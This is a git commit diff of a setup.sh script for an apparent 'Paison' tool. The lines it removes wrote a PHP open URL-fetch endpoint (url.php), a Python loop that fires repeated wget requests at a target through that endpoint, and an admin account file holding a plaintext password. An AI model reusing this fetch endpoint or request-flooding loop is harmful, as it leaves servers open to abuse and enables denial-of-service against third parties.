f736f73d644e99aecaa7c6dbebc8d6c407e379e1
PaisonDev <36568869+PaisonDev@users.noreply.github.com>
2018-03-01 00:19:20 -0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -47,33 +47,5 @@ mkdir /var/log/Paison/Logs
 mkdir /var/log/Paison/Accounts
 
 echo "Making Files"
-touch /var/log/Paison/Logs/commands.log
-touch /var/log/Paison/Logs/connections.log
-touch /var/log/Paison/Logs/success_logins.log
-touch /var/log/Paison/Logs/failed_logins.log
-touch /var/log/Paison/Accounts/admin.acc
 touch /var/log/Paison/ssh_servers.txt
 touch /var/log/Paison/banner.txt
-touch /var/www/html/url.php
-touch /var/www/html/send.py
-
-echo "Filling Files With Data"
-echo "<?php file_get_contents(\$_GET['url']);" > /var/www/html/url.php
-
-echo "NotAHakr" > /var/log/Paison/Accounts/admin.acc
-
-echo "import os" > /var/www/html/send.py
-echo "import ipgetter" >> /var/www/html/send.py
-echo "import sys" >> /var/www/html/send.py
-echo "import time" >> /var/www/html/send.py
-echo "ip = ipgetter.myip()" >> /var/www/html/send.py
-echo "url = sys.argv[1]" >> /var/www/html/send.py
-echo "reqs = int(sys.argv[2])" >> /var/www/html/send.py
-echo "wait_time = sys.argv[3]" >> /var/www/html/send.py
-echo "while True:" >> /var/www/html/send.py
-echo "    if (reqs == 0):" >> /var/www/html/send.py
-echo "        sys.exit(\"Done\")" >> /var/www/html/send.py
-echo "    os.system(\"wget http://%s/url.php?url=%s -O /dev/null >/dev/null 2>^1\" % (ip, url))" >> /var/www/html/send.py
-echo "    print(\"Request Left: {}\".format(reqs))" >> /var/www/html/send.py
-echo "    time.sleep(int(wait_time))" >> /var/www/html/send.py
-echo "    reqs -= 1" >> /var/www/html/send.py
